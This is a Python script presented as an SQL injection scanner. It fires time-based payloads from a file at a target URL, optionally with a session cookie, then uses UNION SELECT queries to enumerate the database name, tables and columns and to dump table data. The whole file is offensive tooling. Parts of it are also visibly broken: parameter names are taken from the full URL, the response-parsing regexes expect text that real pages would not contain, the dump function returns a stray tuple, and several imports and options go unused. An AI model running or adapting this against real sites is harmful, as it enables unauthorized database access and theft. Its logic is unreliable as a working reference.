import argparse
import requests
import time
import threading
import os
import re
import sqlite3

def perform_request(url, payload, cookie):
    start_time = time.time()

    headers = {}
    if cookie:
        headers["Cookie"] = cookie

    try:
        response = requests.get(url, headers=headers, params=payload)
    except requests.RequestException as e:
        return False, url, 0, str(e)

    response_time = time.time() - start_time
    if 200 <= response.status_code < 300:
        return True, url, response_time, ""
    return False, url, response_time, f"HTTP status code: {response.status_code}"

def process_payloads(url, payloads, cookie, output_file, dbms, level, risk):
    injection_point = url.find("*")
    if injection_point != -1:
        param_name = url[:injection_point]
        param_value = url[injection_point + 1:]
        url = url.replace("*", "")

        for payload in payloads:
            payload_params = {param_name: payload}
            success, url_with_payload, response_time, error_message = perform_request(url, payload_params, cookie)
            result_line = ""

            if response_time >= 10:
                result_line = f"✓ SQLi Found! URL: {url_with_payload} - Response Time: {response_time:.2f} seconds"
                print(f"\033[92m{result_line}\033[0m")
            else:
                result_line = f"✗ Not Vulnerable. URL: {url_with_payload} - Response Time: {response_time:.2f} seconds"
                print(f"\033[91m{result_line}\033[0m")

            if output_file:
                with open(output_file, "a") as f:
                    f.write(result_line + "\n")

            # SQLMap-like features
            if success and level >= 2:
                db_name = get_db_name(url_with_payload, cookie, dbms)
                if db_name:
                    print(f"Database name: {db_name}")
                    if level >= 3:
                        tables = get_tables(url_with_payload, cookie, dbms, db_name)
                        if tables:
                            print(f"Tables: {', '.join(tables)}")
                            if level >= 4:
                                columns = get_columns(url_with_payload, cookie, dbms, db_name, tables[0])
                                if columns:
                                    print(f"Columns: {', '.join(columns)}")
                                    if level >= 5:
                                        dump_data(url_with_payload, cookie, dbms, db_name, tables[0], columns[0])
    else:
        for payload in payloads:
            url_with_payload = url + payload
            success, url_with_payload, response_time, error_message = perform_request(url_with_payload, {}, cookie)
            result_line = ""

            if response_time >= 10:
                result_line = f"✓ SQLi Found! URL: {url_with_payload} - Response Time: {response_time:.2f} seconds"
                print(f"\033[92m{result_line}\033[0m")
            else:
                result_line = f"✗ Not Vulnerable. URL: {url_with_payload} - Response Time: {response_time:.2f} seconds"
                print(f"\033[91m{result_line}\033[0m")

            if output_file:
                with open(output_file, "a") as f:
                    f.write(result_line + "\n")

def get_db_name(url, cookie, dbms):
    payload = " AND 1=2 UNION SELECT DATABASE()"
    response = requests.get(url, headers={"Cookie": cookie}, params={url.split("=")[0]: payload})
    if response.status_code == 200:
        match = re.search(r"DATABASE\(\) = (.+)", response.text)
        if match:
            return match.group(1)
    return None

def get_tables(url, cookie, dbms, db_name):
    payload = f" AND 1=2 UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db_name}'"
    response = requests.get(url, headers={"Cookie": cookie}, params={url.split("=")[0]: payload})
    if response.status_code == 200:
        tables = re.findall(r"TABLE_NAME = (.+)", response.text)
        return tables
    return None

def get_columns(url, cookie, dbms, db_name, table_name):
    payload = f" AND 1=2 UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{db_name}' AND TABLE_NAME = '{table_name}'"
    response = requests.get(url, headers={"Cookie": cookie}, params={url.split("=")[0]: payload})
    if response.status_code == 200:
        columns = re.findall(r"COLUMN_NAME = (.+)", response.text)
        return columns
    return None

def dump_data(url, cookie, dbms, db_name, table_name, column_name):
    payload = f" AND 1=2 UNION SELECT {column_name} FROM {table_name}"
    response = requests.get(url, headers={"Cookie": cookie}, params={url.split("=")[0]: payload})
    if response.status_code == 200:
        data = re.findall(rf"{column_name} = (.+)", response.text)
        return data
    return None,

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Scanner')
    parser.add_argument('-u', '--url', help='Target URL', required=True)
    parser.add_argument('-p', '--payloads', help='Payloads file', required=True)
    parser.add_argument('-c', '--cookie', help='Cookie')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('-d', '--dbms', help='Database management system', default='mysql')
    parser.add_argument('-l', '--level', help='Scan level', type=int, default=1)
    parser.add_argument('-r', '--risk', help='Risk level', type=int, default=1)

    args = parser.parse_args()

    with open(args.payloads, 'r') as f:
        payloads = [line.strip() for line in f.readlines()]

    process_payloads(args.url, payloads, args.cookie, args.output, args.dbms, args.level, args.risk)

if __name__ == "__main__":
    main()    
